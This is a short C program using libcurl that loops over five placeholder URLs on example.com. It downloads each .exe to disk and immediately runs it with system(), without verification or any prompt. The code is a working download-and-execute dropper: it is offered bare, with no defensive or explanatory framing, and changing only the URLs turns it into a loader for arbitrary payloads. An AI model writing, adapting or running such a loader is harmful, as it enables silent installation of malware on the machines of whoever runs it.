#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

void downloadAndExecute(const char* fileURL) {
    const char* fileName = "downloaded_file.exe";
    CURL* curl;
    FILE* fp;
    CURLcode res;

    curl = curl_easy_init();
    if (curl) {
        fp = fopen(fileName, "wb");
        curl_easy_setopt(curl, CURLOPT_URL, fileURL);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);
        fclose(fp);
        if (res == CURLE_OK) {
            system(fileName);
        }
    }
}

int main() {
    const char* urls[] = {
        "http://example.com/file1.exe",
        "http://example.com/file2.exe",
        "http://example.com/file3.exe",
        "http://example.com/file4.exe",
        "http://example.com/file5.exe"
    };
    for (int i = 0; i < 5; ++i) {
        downloadAndExecute(urls[i]);
    }
    return 0;
}